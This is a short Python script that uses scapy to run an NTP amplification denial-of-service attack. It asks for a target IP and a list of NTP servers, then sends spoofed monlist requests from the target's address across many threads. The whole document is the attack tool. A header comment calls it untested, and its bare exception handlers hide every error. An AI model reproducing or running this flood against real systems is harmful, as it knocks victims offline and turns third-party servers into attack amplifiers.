# Untested. This should theoritcally work.
import random
import threading
from scapy.all import *

try:
	ip = raw_input("Target: ")
	threads = input("Threads: ")
	openList = raw_input("List: ")

	with open(openList, "r") as openedList:
		lines = openedList.readlines()

	payload = "\x17\x00\x03\x2a\x00\x00\x00\x00"

	def ntpflood():
		try:
			while True:
				port = random.randint(1, 65535)
				packet = IP(src=ip, dst=random.choice(lines))/UDP(sport=port, dport=123)/Raw(load=payload)
				send(packet, loop=1, verbose=0)
		except:
			pass

	for i in range(int(threads)):
		thread = threading.Thread(target=ntpflood)
		thread.start()
except:
	pass
